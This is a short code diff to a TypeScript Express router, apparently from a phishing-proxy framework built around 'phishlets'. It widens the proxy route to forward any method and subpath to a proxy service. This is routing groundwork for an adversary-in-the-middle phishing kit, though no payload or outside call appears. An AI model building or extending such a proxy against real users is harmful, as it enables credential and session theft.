@@ -53,13 +53,12 @@ router.get('/logs/:sessionId', asyncHandler(async (req: Request, res: Response) 
 }));
 
 // Proxy
-router.get('/proxy/:phishletName', asyncHandler(async (req: Request, res: Response) => {
+router.all('/proxy/:phishletName/*', asyncHandler(async (req: Request, res: Response) => {
     const phishlet = await phishletService.findAll().then(phishlets => phishlets.find(p => p.name === req.params.phishletName));
     if (!phishlet) {
         return res.status(404).json(createApiResponse(false, null, 'Phishlet not found'));
     }
-    const html = await proxyService.handleRequest(phishlet);
-    res.send(html);
+    await proxyService.handleRequest(req, res, phishlet);
 }));
 
 export default router;
